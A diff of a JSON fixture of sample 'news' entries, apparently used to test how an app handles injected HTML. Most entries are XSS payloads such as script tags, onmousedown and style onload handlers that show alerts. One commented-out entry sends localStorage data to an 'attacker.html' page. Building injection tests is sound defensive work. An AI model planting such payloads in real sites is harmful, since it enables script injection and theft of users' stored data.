@@ -4,16 +4,12 @@
 		"data" : " This is a description of news 1"
 	},
 	{
-		"title" : "Sample news 2",
-		"data" : "This is a description of news 2"
-	},
-	{
-		"title" : "Hello<script type='text/javascript'> alert('hi'); </script> World!",
-		"data"	: " <a href='something' onmousedown='alert();'> Click here </a>"
+		"title" : "Click event",
+		"data"	: " <a href='something' onmousedown='alert(\"got ur click\");'> Click here </a>"
 	},
 	{
 		"title" : "Script in attribute",
-		"data" : "<style onload='' ></style>"
+		"data" : "<!-- <style onload='alert(\"js loaded\"); ></style> -->"
 	},
     {
 		"title" : "Click jacking without initial iframe",
@@ -32,12 +28,15 @@
 		"data" : "<!--<style onload='document.location=\"attacker.html?p=\"+localStorage.count;'></style>-->"
 	},
 	{
-		"title" : "",
+		"title" :	"Nested injection",
 		"data"	:	"<p><b><i><a><tr></tr></a></i></b><p>"
 	},
     {
-        "title" : "SCRIPT",
-        "data"  : "<script type='text/javascript'>alert('hey');</script>"
+        "title" : "SCRIPT That will not be activated by default",
+        "data"  : "<script type='text/javascript'>alert('this will not be executed');</script>"
+    },
+    {
+    	"title" : "UI redressing",
+        "data"  : "<style type='text/css'></style>"	
     }
-
 ]
